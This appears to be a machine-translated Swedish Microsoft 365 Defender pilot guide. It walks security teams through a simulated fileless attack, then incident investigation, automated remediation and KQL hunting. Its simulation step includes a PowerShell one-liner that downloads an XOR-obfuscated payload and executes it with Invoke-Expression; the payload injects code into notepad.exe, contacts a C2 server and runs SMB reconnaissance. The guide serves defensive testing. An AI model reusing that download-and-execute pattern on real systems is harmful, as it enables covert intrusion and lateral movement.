---
title: Kör dina Microsoft 365 Defender-attackberäkningar
description: Kör attack simuleringar för ditt Microsoft 365 Defender-pilotprojekt för att se hur det både känns igen och åtgärdas snabbt.
keywords: Microsoft Threat Protection pilotattackaktivering, kör Microsoft Threat Protection pilotattack-simulering, simulera attack i Microsoft Threat Protection, Microsoft Threat Protection pilotprojekt, cybersäkerhet, avancerade beständiga hot, företagssäkerhet, enheter, enhet, identitet, användare, data, program, incidenter, automatiserad undersökning och åtgärd, avancerad sökning
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: f1714eeeb30d1dd4c209d063604e1031369b5ddb
ms.sourcegitcommit: 855719ee21017cf87dfa98cbe62806763bcb78ac
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 01/22/2021
ms.locfileid: "49933060"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Kör dina Microsoft 365 Defender-attackberäkningar

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Planering](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)<br/>[Planering](mtp-pilot-plan.md)|[![Förbereda](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)<br/>[Förberedelse](prepare-mtpeval.md)|![Simulera attack](../../media/phase-diagrams/3-simluate.png)<br/>Simulera attack|[![Stäng och sammanfatta](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)<br/>[Stäng och sammanfatta](mtp-pilot-close.md)|
|--|--|--|--|
|||*Du är här!*||

Du befinner dig för närvarande i attackfasen.

När du har förberett pilotmiljön är det dags att testa incidenthanteringen i Microsoft 365 Defender och funktionerna för automatisk undersökning och åtgärd. Vi hjälper dig att simulera en avancerad attack som utnyttjar avancerade tekniker för att dölja avkänning. Attacken uppräkningar öppna SMB-sessioner (Server Message Block) på domänkontrollanter och hämtar de senaste IP-adresserna till användarnas enheter. Den här kategorin av attacker omfattar vanligtvis inte filer som släppts på offerts enhet – de förekommer endast i minnet. De "bor på landet" med befintliga system- och administrationsverktyg och matar in kod i systemprocesser för att dölja körningen, ett sådant beteende gör att de kan undvika identifieringen och finnas kvar på enheten.

I den här simuleringen börjar vårt exempelscenario med ett PowerShell-skript. En användare kan luras att köra ett skript. Eller så kan skriptet köras från en fjärranslutning till en annan dator från en tidigare smittad enhet – attackeraren försöker flytta sig på plats i nätverket. Det kan vara svårt att identifiera de här skripten eftersom administratörer också ofta kör skript på distans för att utföra olika administrativa aktiviteter.

![Fillös PowerShell-attack med processinjicering och SMB-reconnaisance-attackdiagram](../../media/mtp/mtpdiydiagram.png)

Under simuleringen matar attacken in shellcode i en till synes satsprocess. Scenariot kräver att du använder notepad.exe. Vi valde den här processen för simuleringen, men attacker är mer troliga att de riktar sig mot en långvariga systemprocess, till exempel svchost.exe. Shellcode-koden fortsätter sedan för att kontakta attackens kommando- och kontrollserver (C2) för att få instruktioner om hur du kan fortsätta. Skriptet försöker köra reconnaissance-frågor mot domänkontrollanten (DC). Med reconnaissance tillåts en attackerning för att få information om den senaste användarinloggningsinformationen. När attacker har den här informationen kan de flytta förflytta sig i nätverket för att komma till ett visst känsligt konto

> [!IMPORTANT]
> För bästa resultat följer du attackberäkningsanvisningarna så nära som möjligt.

## <a name="simulation-environment-requirements"></a>Simuleringsmiljökrav

Eftersom du redan har konfigurerat pilotmiljön under förberedelsefasen bör du kontrollera att du har två enheter för det här scenariot: en testenhet och en domänkontrollant.

1. Kontrollera att klientorganisationen har [aktiverat Microsoft 365 Defender.](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)

2. Verifiera konfigurationen av testdomänkontrollanten:

   - Enheten körs med Windows Server 2008 R2 eller en senare version.
   - Testdomänkontrollanten till [Microsoft Defender för identitet och](https://docs.microsoft.com/azure/security-center/security-center-wdatp) aktivera [fjärrhantering.](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)
   - Kontrollera att [Microsoft Defender för identitets- och Microsoft Cloud App Security-integrering](https://docs.microsoft.com/cloud-app-security/mdi-integration) har aktiverats.
   - En testanvändare skapas i din domän – inga administratörsbehörigheter krävs.

3. Kontrollera testenhetskonfigurationen:

   1. Enheten körs med Windows 10 version 1903 eller en senare version.

   1. Testenheten är ansluten till testdomänen.

   1. [Aktivera Windows Defender Antivirus.](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) Om du har problem med att aktivera Windows Defender Antivirus kan du gå till den här [felsökningsavsnittet.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)

   1. Kontrollera att testenheten är [onboarded till Microsoft Defender för Slutpunkt).](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

Om du använder en befintlig klientorganisation och implementerar enhetsgrupper skapar du en dedikerad enhetsgrupp för testenheten och pushar den till den översta nivån i konfigurations-UX.

## <a name="run-the-attack-scenario-simulation"></a>Simulera attackscenariot

Så här kör du simuleringen av attackscenariot:

1. Logga in på testenheten med testanvändarkontot.

2. Öppna ett Windows PowerShell-fönster på testenheten.

3. Kopiera följande simuleringsskript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Om du öppnar det här dokumentet i en webbläsare kan du stöta på problem med att kopiera hela texten utan att förlora vissa tecken eller introducera extra radbrytningar. Hämta dokumentet och öppna det på Adobe Reader.

4. När du uppmanas till det klistrar du in och kör det kopierade skriptet.

> [!NOTE]
> Om du kör PowerShell med fjärrskrivbordsprotokoll (RDP) kan du använda kommandot Skriv Urklippstext i RDP-klienten eftersom **ctrl-V-snabbtangenten** eller högerklicks-inklistringsmetoden kanske inte fungerar. De senaste versionerna av PowerShell accepterar inte heller den metoden ibland, du kanske först måste kopiera till Anteckningar i minnet, kopiera den i den virtuella datorn och sedan klistra in den i PowerShell.

Några sekunder senare <i>öppnasnotepad.exe.</i> En simulerad attackkod matas in i notepad.exe. Låt den automatiskt genererade Anteckningar-instansen vara öppen för att få hela scenariot.

Den simulerade attackkoden försöker kommunicera till en extern IP-adress (som simulerar C2-servern) och försöker sedan igen med reconnaissance mot domänkontrollanten via SMB.

Ett meddelande visas på PowerShell-konsolen när skriptet har slutförts.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Om du vill se hur automatiserad incident och svar fungerar i praktiken behåller du notepad.exe processen öppen. Automatiserad incident och svar stoppar anteckningar-processen.

## <a name="investigate-an-incident"></a>Undersöka en incident

> [!NOTE]
> Innan vi går igenom den här simuleringen kan du titta på följande video för att se hur incidenthantering hjälper dig att samla relaterade aviseringar som en del av undersökningsprocessen, var du hittar dem i portalen och hur det kan hjälpa dig i dina säkerhetsåtgärder:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Om du byter till SOC-analytikernas vy kan du nu börja undersöka attacken i Microsoft 365 Säkerhetscenter-portalen.

1. Öppna [incidentkön i Microsoft 365 Säkerhetscenter-portalen](https://security.microsoft.com/incidents) från valfri enhet.

2. Gå till **Incidenter** på menyn.

    ![Skärmbild av incidenter som visas på den vänstra menyn i Säkerhetscenter för Microsoft 365](../../media/mtp/fig1.png)

3. Den nya incidenten för den simulerade attacken visas i incidentkön.

    ![Skärmbild av incidentkön](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Undersök attacken som en enda händelse

Microsoft 365 Defender korrelerar analyser och aggregerar alla relaterade varningar och undersökningar från olika produkter till en incidentenhet. Genom att göra det visar Microsoft 365 Defender en bredare attack story, så att SOC-analytiker kan förstå och hantera komplexa hot.

De varningar som genereras under den här simuleringen är associerade med samma hot, och till följd av det sammanställs automatiskt som en enda händelse.

Så här visar du incidenten:

1. Navigera till **ärendekön.**

   ![Skärmbild av incidenter från navigeringsmenyn](../../media/mtp/fig1.png)

2. Välj det senaste objektet genom att klicka på cirkeln till vänster om incidentnamnet. På en sidopanel visas ytterligare information om händelsen, inklusive alla relaterade aviseringar. Varje incident har ett unikt namn som beskriver den baserat på attributen i de aviseringar som den inkluderar.

   ![Skärmbild av sidan incidenter där genererade aviseringar sammanställs under simuleringen](../../media/mtp/fig4.png)

   Aviseringarna som visas på instrumentpanelen kan filtreras baserat på tjänstresurser: Microsoft Defender för identitet, Microsoft Cloud App Security, Microsoft Defender för slutpunkt, Microsoft 365 Defender och Microsoft Defender för Office 365.

3. Välj **sidan Öppna incident** om du vill ha mer information om incidenten.

   På sidan **Incident** visas alla aviseringar och information som rör incidenten. Informationen omfattar de enheter och tillgångar som ingår i aviseringen, aviseringens identifieringskälla (Microsoft Defender för identitet, EDR) och orsaken till att de länkades ihop. När du granskar incidentvarningslistan visas attackens förlopp. Från den här vyn kan du se och undersöka de enskilda aviseringarna.

   Du kan också klicka **på Hantera** incident i den högra menyn för att tagga händelsen, tilldela den till dig själv och lägga till kommentarer.

   ![Skärmbild av var du klickar på Hantera incident](../../media/mtp/fig5a.png)

   ![Skärmbild av fälten i panelen Hantera incident där du kan tagga händelsen, tilldela den till dig själv och lägga till kommentarer ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Granska genererade aviseringar

Låt oss titta på några av de aviseringar som genererades vid den simulerade attacken.

> [!NOTE]
> Vi går bara igenom några få av de aviseringar som genererades under den simulerade attacken. Beroende på vilken version av Windows och Microsoft 365 Defender-produkter som körs på testenheten kan du se fler aviseringar som visas i en något annan ordning.

![Skärmbild av genererade aviseringar](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Varning: Observerad injicering av misstänkt process (källa: Microsoft Defender för slutpunkt EDR)

Avancerade attacker använder avancerade och avancerade metoder för att bevara minnet och dölja för identifieringsverktyg. En vanlig teknik är att arbeta från en betrodd systemprocess i stället för en skadlig körbar fil, vilket gör det svårt för identifieringsverktyg och säkerhetsåtgärder att upptäcka den skadliga koden.

För att SOC-analytiker ska kunna fånga dessa avancerade attacker tillhandahåller djup minnesmätare i Microsoft Defender för Endpoint vår molntjänst med synlig information om olika igenkänningstekniker för korsprocesskod. I följande bild visas hur Defender för Slutpunkt upptäckte och avisering vid försök att mata in kod för <i>attnotepad.exe. </i>

![Skärmbild av varningen för injicering av potentiellt skadlig kod](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Varning: Oväntat beteende som observerats av en process som körs utan kommandoradsargument (Källa: Microsoft Defender för Slutpunkt EDR)

Microsoft Defender för slutpunktsidentifieringar riktar ofta det vanligaste attributet i en attackteknik. Den här metoden säkerställer varaktigheten och höjer fältet för attackerarna att byta till nyare taktiker.

Vi använder storskaliga utbildningsalgoritmer för att upprätta vanliga processers normala beteende i en organisation och globalt och se upp när dessa processer visar avvikande beteende. Dessa avvikande beteenden anger ofta att oomenlig kod infördes och körs i en annars betrodd process.

I det här scenariot har <i> processennotepad.exe</i> onormalt beteende, vilket innefattar kommunikation med en extern plats. Det här resultatet är oberoende av den specifika metod som används för att introducera och köra den skadliga koden.

> [!NOTE]
> Eftersom den här aviseringen baseras på maskininlärningsmodeller som kräver ytterligare bearbetning av backend, kan det ta lite tid innan den här aviseringen visas i portalen.

Observera att bland varningsuppgifterna finns den externa IP-adressen – en indikator som du kan använda som en pivot-adress för att expandera undersökningen.

Välj IP-adressen i aviseringsprocessträdet för att visa informationssidan för IP-adressen.

![Skärmbild av en avisering om oväntat beteende för en process som körs utan kommandoradsargument](../../media/mtp/fig8.png)

På följande bild visas den valda informationssidan för IP-adress (klicka på IP-adress i trädvyn Aviseringsprocess).
![Skärmbild av informationssidan för IP-adress](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Varning: Användar- och IP-adressrepaning (SMB) (Källa: Microsoft Defender för identitet)

Uppräkning med SMB-protokoll (Server Message Block) gör att attacker kan hämta information om senaste användarinloggning som hjälper dem att flytta enkelt genom nätverket för att komma åt ett visst känsligt konto.

Vid den här identifieringen utlöses en avisering när SMB-sessionuppräkningen körs mot en domänkontrollant.

![Skärmbild av Microsoft Defender för identitetsavisering för omkonfiguration av användar- och IP-adress](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Granska tidslinjen för enheten [Microsoft Defender för slutpunkt]

När du har utforskat de olika aviseringarna i den här händelsen går du tillbaka till sidan för incidenten som du undersöker tidigare. Välj fliken **Enheter** på sidan för incidenter om du vill granska enheterna som var inblandade i den här incidenten enligt uppgifter från Microsoft Defender för Endpoint och Microsoft Defender för identitet.

Välj namnet på enheten där attacken utfördes för att öppna entitetssidan för den specifika enheten. På den sidan kan du se aviseringar som utlöstes och relaterade händelser.

Välj fliken **Tidslinje** för att öppna enhetens tidslinje och visa alla händelser och beteenden som observerats på enheten i kronologisk ordning, var kopplade med aviseringarna upphöjda.

![Skärmbild av enhetens tidslinje med beteenden](../../media/mtp/fig11.png)

Om du utökar några av de intressanta beteendenna får du användbar information, till exempel processträd.

Rulla till exempel nedåt tills du hittar den aviseringshändelse **som misstänkt processinventering har observerats.** Väljpowershell.exe som matas **in notepad.exe** händelse under den, för att visa hela processträdet för det här beteendet under diagrammet med händelseenheter i sidofönstret.  Använd sökfältet för filtrering om det behövs.

![Skärmbild av processträdet för det valda beteendet för att skapa filer i PowerShell](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Granska användarinformationen [Microsoft Cloud App Security]

På incidentsidan väljer du fliken **Användare för** att visa listan över användare som är inblandade i attacken. Tabellen innehåller ytterligare information om varje användare, inklusive varje användares **undersökningsprioritetspoäng.**

Välj användarnamnet för att öppna användarens profilsida där ytterligare undersökning kan utföras. [Läs mer om att undersöka riskfyllda användare.](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)

![Skärmbild av användarsidan för molnappsäkerhet](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Automatiserad undersökning och åtgärd

> [!NOTE]
>Innan vi går igenom den här simuleringen kan du titta på följande video för att bekanta dig med vad automatiska självrektaneringar är, var du hittar det i portalen och hur det kan vara till hjälp i dina säkerhetsåtgärder:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Gå tillbaka till incidenten i Microsoft 365 Säkerhetscenter-portalen. På **fliken** Undersökningar på sidan **Incident** visas de automatiserade undersökningar som utlöstes av Microsoft Defender för identitet och Microsoft Defender för Slutpunkt. Skärmbilden nedan visar endast den automatiska undersökning som utlösts av Defender för Endpoint. Som standard åtgärdar Defender för Slutpunkt automatiskt artefakterna som hittades i kön, vilket kräver åtgärd.

![Skärmbild av automatiserade undersökningar relaterade till händelsen](../../media/mtp/fig14.png)

Markera aviseringen som utlöste en undersökning för att öppna **informationssidan** Undersökning. Följande information visas:

- Avisering(er) som utlöste den automatiska undersökningen.
- Påverkade användare och enheter. Om indikatorer hittas på ytterligare enheter visas även dessa enheter.
- Lista över bevis. Enheter som hittas och analyseras, till exempel filer, processer, tjänster, drivrutiner och nätverksadresser. Dessa enheter analyseras för möjliga relationer till aviseringen och klassificeras som någon av dem eller som skadliga.
- Hot hittades. Kända hot som hittas under undersökningen.

> [!NOTE]
> Beroende på tidsinställningar kan den automatiska undersökningen fortfarande köras. Vänta några minuter på att processen slutförs innan du samlar in och analyserar bevisen och granskar resultaten. Uppdatera sidan **Undersökningsinformation för** att få de senaste resultaten.

![Skärmbild av informationssidan om undersökning](../../media/mtp/fig15.png)

Under den automatiska undersökningen identifierade Microsoft Defender för Endpoint notepad.exe process, som matades in som en av artefakterna som kräver åtgärd. Defender för Endpoint stoppar automatiskt den misstänkta processinjiceringen som en del av den automatiska åtgärd.

Du kan se <i>notepad.exe</i> försvinna från listan över körprocesser på testenheten.

## <a name="resolve-the-incident"></a>Lös incidenten

Stäng händelsen när undersökningen har slutförts och bekräftat att den ska åtgärdas.

Välj **Hantera incident.** Ange statusen Lös **incidenten** och välj relevant klassificering.

När incidenten har lösts stänger den alla associerade aviseringar i Microsoft 365 Säkerhetscenter och i de relaterade portalerna.

![Skärmbild av sidan Incidenter med öppna panelen Hantera incident där du kan klicka på växeln för att lösa problemet](../../media/mtp/fig16.png)

Då avslutas attackaktiveringen för incidenthantering och automatiserad undersökning och åtgärdsscenarier. Nästa simulering tar dig genom förebyggande hot efter potentiellt skadliga filer.

## <a name="advanced-hunting-scenario"></a>Avancerad sökning

> [!NOTE]
> Innan vi går igenom simuleringen kan du titta på följande video för att förstå de avancerade sökbegreppen, se var du hittar det i portalen och veta hur det kan hjälpa dig i dina säkerhetsåtgärder:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Krav på miljön för fiske

Det krävs en enda intern postlåda och enhet för det här scenariot. Du behöver också ett externt e-postkonto för att skicka testmeddelandet.

1. Kontrollera att klientorganisationen har [aktiverat Microsoft 365 Defender.](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)
2. Identifiera en målpostlåda som ska användas för att ta emot e-post.
    a. Den här postlådan måste övervakas av Microsoft Defender för Office 365 b. Enheten från krav 3 måste komma åt den här postlådan
3. Konfigurera en testenhet: a. Kontrollera att du använder Windows 10 version 1903 eller senare.
    b. Anslut testenheten till testdomänen.
    c. [Aktivera Windows Defender Antivirus.](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) Om du har problem med att aktivera Windows Defender Antivirus kan du gå till [den här felsökningsavsnittet.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
    d. [Gå in på Microsoft Defender för Slutpunkt.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

### <a name="run-the-simulation"></a>Kör simuleringen

1. Från ett externt e-postkonto skickar du ett e-postmeddelande till postlådan som identifierats i steg 2 i avsnittet om testmiljökrav. Inkludera en bifogad fil som tillåts genom befintliga principer för e-postfilter. Den här filen behöver inte vara skadlig eller körbar. De föreslagna filtyperna är <i>.pdf,</i> <i>.exe</i> (om tillåts) eller Office-dokument, till exempel en Word-fil.
2. Öppna det skickade e-postmeddelandet från enheten som konfigurerats enligt definitionen i steg 3 i avsnittet för testmiljökrav. Öppna den bifogade filen eller spara den på enheten.

#### <a name="go-hunting"></a>Gå på visning

1. Öppna security.microsoft.com portalen.

2. Gå till **Hunting > Advanced hunting.**

   ![Skärmbild av avancerad sökning i navigeringsfältet på M365 Säkerhetscenter-portalen](../../media/mtp/fig17.png)

3. Skapa en fråga som börjar genom att samla in e-posthändelser.

   1. Välj Nytt i frågefönstret.

   1. Dubbelklicka på tabellen EmailEvents i schemat.

      ```console
      EmailEvents
      ```

   1. Ändra tidsperioden till de senaste 24 timmarna. Anta att e-postmeddelandet du skickade när du körde simuleringen ovan har varit under de senaste 24 timmarna, annars kan du ändra tidsperioden.

      ![Skärmbild av var du kan ändra tidsperioden. Öppna den nedrullningade menyn för att välja mellan olika tidsintervall](../../media/mtp/fig18.png)

   1. Kör frågan. Du kan få många resultat beroende på pilotens miljö.

      > [!NOTE]
      > Se nästa steg för filtreringsalternativ för att begränsa dataretur.

      ![Skärmbild av de avancerade sökresultaten för sökning](../../media/mtp/fig19.png)

        > [!NOTE]
        > Avancerad sökning visar frågeresultat som tabelldata. Du kan också välja att visa data i andra formattyper, till exempel diagram.

   1. Titta på resultaten och se om du kan identifiera e-postmeddelandet som du har öppnat. Det kan ta upp till två timmar innan meddelandet dyker upp i avancerad sökning. Om e-postmiljön är stor och det finns många resultat kan du använda alternativet **Visa filter för** att hitta meddelandet.

      I exemplet skickades e-postmeddelandet från ett Yahoo-konto. Klicka på **+** ikonen bredvid **yahoo.com** avsnittet SenderFromDomain och  klicka sedan på Använd för att lägga till den valda domänen i frågan. Använd den domän eller det e-postkonto som användes för att skicka testmeddelandet i steg 1 i Kör simuleringen för att filtrera resultaten. Kör frågan igen för att få ett mindre resultat för att verifiera att meddelandet från simuleringen visas.

      ![Skärmbild av filtren. Använd filter för att begränsa sökningen och hitta det du söker snabbare.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Klicka på de resulterande raderna i frågan så att du kan granska posten.

      ![Skärmbild av panelen för kontroll av postsidan som öppnas när ett avancerat resultat för sökning markeras](../../media/mtp/fig21.png)

4. Nu när du har kontrollerat att du kan se e-postmeddelandet kan du lägga till ett filter för de bifogade filerna. Fokusera på alla e-postmeddelanden med bifogade filer i miljön. I det här scenariot ska du fokusera på inkommande e-postmeddelanden, inte de som skickas från din miljö. Ta bort eventuella filter som du har lagt till för att hitta meddelandet och lägga till "| där **AttachmentCount > 0** och **EmailDirection**  ==  **"Inbound"**

   I följande fråga visas resultatet med en kortare lista än den första frågan för alla e-posthändelser:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Inkludera sedan informationen om den bifogade filen (t.ex. filnamn, hash-kod) i resultatuppsättningen. Det gör du genom att koppla **tabellen EmailAttachmentInfo.** De gemensamma fälten som ska användas för att ansluta är i det här fallet **NetworkMessageId** och **RecipientObjectId.**

   Följande fråga innehåller även ytterligare en rad med "| **project-rename EmailTimestamp=Timestamp**" som hjälper dig att identifiera vilken tidsstämpel som var relaterad till e-postmeddelandet och tidsstämplar relaterade till filåtgärder som du ska lägga till i nästa steg.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Använd sedan **SHA256-värdet** från tabellen **EmailAttachmentInfo** för att hitta **DeviceFileEvents** (filåtgärder som hände på slutpunkten) för hashtaggen. Det vanliga fältet är SHA256-hash för den bifogade filen.

   Den resulterande tabellen innehåller nu information från slutpunkten (Microsoft Defender för slutpunkt), till exempel enhetsnamn, vilken åtgärd som har gjorts (i det här fallet filtrerat för att bara inkludera FileCreated-händelser) och var filen lagrades. Kontonamnet som är kopplat till processen inkluderas också.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   Nu har du skapat en fråga som identifierar alla inkommande e-postmeddelanden där användaren öppnade eller sparade den bifogade filen. Du kan också förfina den här frågan och filtrera efter specifika avsändardomäner, filstorlekar, filtyper och så vidare.

7. Funktioner är en särskild typ av koppling, som gör att du kan hämta mer TI-data om en fil, t.ex. dess särskilda fall, undertecknarens och utfärdares information. Använd funktionen **FileProfile() för** att få mer information om filen:

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Skapa en identifiering

När du har skapat en fråga som identifierar  information som du vill få aviseringar om om de sker i framtiden kan du skapa en anpassad identifiering från frågan.

Anpassade identifieringar kör frågan enligt den frekvens du har angett, och resultaten av frågorna skapar säkerhetsvarningar baserat på de påverkade tillgångarna du väljer. Dessa varningar korreleras till incidenter och kan utvärderas som andra säkerhetsvarningar som genereras av någon av produkterna.

1. Ta bort rad 7 och 8 som lades till i steg 7 i go-instruktionerna för sökning på frågesidan och klicka **på Skapa identifieringsregel.**

   ![Skärmbild av var du kan klicka på skapa identifieringsregel på den avancerade sidan för sökning](../../media/mtp/fig22.png)

   > [!NOTE]
   > Om du **klickar på Skapa identifieringsregel** och frågan innehåller syntaxfel sparas inte identifieringsregeln. Dubbelkolla frågan för att säkerställa att det inte uppstår några fel.

2. Fyll i de obligatoriska fälten med informationen som gör att säkerhetsgruppen förstår varningen, varför den skapades och vilka åtgärder du förväntar dig att de ska vidta.

   ![Skärmbild av sidan skapa identifieringsregel där du kan definiera aviseringsinformation](../../media/mtp/fig23.png)

   Se till att fylla i fälten tydligt för att ge nästa användare ett välgrundat beslut om aviseringen för identifieringsregeln

3. Välj vilka enheter som påverkas i den här aviseringen. I så fall väljer du **Enhet** och **Postlåda.**

   ![Skärmbild av sidan skapa identifieringsregel där du kan välja parametrar för påverkade enheter](../../media/mtp/fig24.png)

4. Bestäm vilka åtgärder som ska vidtas om aviseringen utlöses. I så fall kör du en antivirussökning, men andra åtgärder kan vidtas.

   ![Skärmbild av sidan skapa identifieringsregel där du kan köra en antivirussökning när en avisering utlöses för att åtgärda hot](../../media/mtp/fig25.png)

5. Välj omfattning för aviseringsregeln. Eftersom den här frågan involverar enheter är enhetsgrupper relevanta i den här anpassade identifieringen enligt Microsoft Defender för slutpunktskontexten. När du skapar en anpassad identifiering som inte inkluderar enheter som påverkade enheter, gäller inte omfattningen.

   ![Skärmbild av sidan skapa identifieringsregel där du kan ställa in omfattningen för aviseringsregeln som hanterar dina förväntningar på resultaten som visas](../../media/mtp/fig26.png)

   För det här pilottestet kanske du vill begränsa regeln till en delmängd av testenheterna i produktionsmiljön.

6. Välj **Skapa**. Välj sedan Anpassade **identifieringsregler** i navigeringsfönstret.

   ![Skärmbild av alternativet Anpassade identifieringsregler på menyn](../../media/mtp/fig27a.png)

   ![Skärmbild av sidan Identifieringsregler som visar regel- och körningsinformation](../../media/mtp/fig27b.png)

   På den här sidan kan du välja identifieringsregel, vilket öppnar en informationssida.

   ![Skärmbild av sidan för e-postbilagor där du kan se status för regelkörningen, utlösta aviseringar och åtgärder, redigera identifieringen och så vidare](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Ytterligare avancerade övningar för sökning

I följande webbsändningar får du lära dig mer om avancerad sökning med hjälp av avancerade sökningar i Microsoft 365 Defender, där du kan skapa korsfrågor, pivotera till enheter och skapa anpassade identifieringar och åtgärder.

> [!NOTE]
> Förbered dig med ditt eget GitHub-konto för att köra sökfrågor i testlabbmiljön.

|Title|Beskrivning|Ladda ned MP4|Titta på YouTube|CSL-fil att använda|
|---|---|---|---|---|
|Avsnitt 1: Grunderna i KQL|Vi tar upp grunderna för avancerade sökfunktioner i Microsoft 365 Defender. Läs mer om tillgängliga avancerade sökdata och grundläggande KQL-syntax och -operatorer.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Avsnitt 1: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|Avsnitt 2: Kopplingar|Vi fortsätter att lära oss mer om data inom avancerad sökning och hur ni kan koppla ihop tabeller. Lär dig mer om inre, yttre, unika och semi-kopplingar och nyanserna hos standardkopplingen i Kusto innerunique.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Avsnitt 2: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Avsnitt 3: Sammanfatta, pivotera och visualisera data|Nu när vi kan filtrera, ändra och ansluta till data är det dags att börja sammanfatta, mäta, pivotera och visualisera. I det här avsnittet går vi in på sammanfattningsoperatorn och några av beräkningarna du kan utföra när du dyker upp i ytterligare tabeller i det avancerade sökschemat. Vi omvandlar datamängderna till diagram som kan förbättra analysen.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Avsnitt 3: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
